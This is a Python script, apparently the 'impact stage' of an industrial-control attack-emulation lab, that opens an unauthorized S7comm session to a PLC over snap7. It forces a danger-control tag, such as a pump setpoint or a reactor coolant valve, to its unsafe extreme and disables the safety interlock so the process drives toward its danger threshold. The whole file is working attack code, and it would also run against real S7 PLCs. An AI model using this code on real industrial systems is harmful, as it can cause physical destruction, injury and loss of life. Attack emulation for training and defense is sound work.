#!/usr/bin/env python3
# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
"""Impact stage — manipulate the PLC directly over S7comm from the ews.

The ews is not an authorized S7 client, yet here it opens a direct S7comm session
to the PLC and writes control tags to drive the physical process unsafe: it
DISABLES the safety interlock and forces the danger-control tag to its unsafe
extreme. With the interlock off, the Phase-1 physics carry the process toward its
danger threshold — real, physical impact.

Scenario-agnostic: which tags to manipulate come from the ACTIVE process's tag map
and SAFETY descriptor (sim/, mounted read-only at /opt/sim, selected by
KAAVAL_PROCESS). For the pump that means setpoint->100 % + interlock off; for the
reactor, coolant valve->0 % + high-temp interlock off. No hardcoded offsets.

MITRE ATT&CK for ICS: T0855 Unauthorized Command Message, T0836 Modify Parameter,
T0831 Manipulation of Control.
"""

import os
import struct
import sys

sys.path.insert(0, os.environ.get("KAAVAL_SIM_PATH", "/opt/sim"))
import processes  # noqa: E402  (from the mounted sim/)
from snap7.client import Client  # noqa: E402

PLC_HOST = os.environ.get("PLC_HOST", "plc")
PLC_PORT = int(os.environ.get("S7_PORT", "102"))


def _write_real(cli, db, offset, value):
    data = bytearray(4)
    struct.pack_into(">f", data, 0, float(value))
    cli.db_write(db, offset, data)


def _set_bool(cli, db, byte, bit, value):
    cur = cli.db_read(db, byte, 1)
    b = bytearray([cur[0]])
    if value:
        b[0] |= (1 << bit)
    else:
        b[0] &= ~(1 << bit) & 0xFF
    cli.db_write(db, byte, b)


def main():
    p = processes.load()
    by_name = {t.name: t for t in p.TAGS}
    s = p.SAFETY
    db = p.DB_NUMBER
    interlock = by_name[s["interlock_tag"]]
    ctrl = by_name[s["danger_control_tag"]]
    unsafe = s["danger_control_value"]

    print(f"[attack] direct S7comm -> {PLC_HOST}:{PLC_PORT} DB{db} (process={p.NAME})")
    cli = Client()
    cli.connect(PLC_HOST, 0, 1, tcp_port=PLC_PORT)
    try:
        before = cli.db_read(db, 0, p.DB_SIZE)
        print(f"[attack] before: {ctrl.name}="
              f"{struct.unpack_from('>f', before, ctrl.offset)[0]:.0f}  "
              f"{interlock.name}={bool(before[interlock.offset] & (1 << interlock.bit))}")

        # T0836/T0831: force the danger-control tag to its unsafe extreme.
        _write_real(cli, db, ctrl.offset, unsafe)
        # T0855: disable the safety interlock.
        _set_bool(cli, db, interlock.offset, interlock.bit, False)

        after = cli.db_read(db, 0, p.DB_SIZE)
        print(f"[attack] after:  {ctrl.name}="
              f"{struct.unpack_from('>f', after, ctrl.offset)[0]:.0f}  "
              f"{interlock.name}={bool(after[interlock.offset] & (1 << interlock.bit))}")
        print(f"[attack] {interlock.name} DISABLED, {ctrl.name} forced to {unsafe:.0f} "
              f"— process will run toward its danger threshold")
    finally:
        cli.disconnect()


if __name__ == "__main__":
    main()
